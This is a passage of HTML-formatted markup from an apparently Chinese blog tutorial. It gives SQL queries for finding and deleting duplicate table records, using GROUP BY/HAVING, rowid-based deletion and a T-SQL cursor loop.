style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img 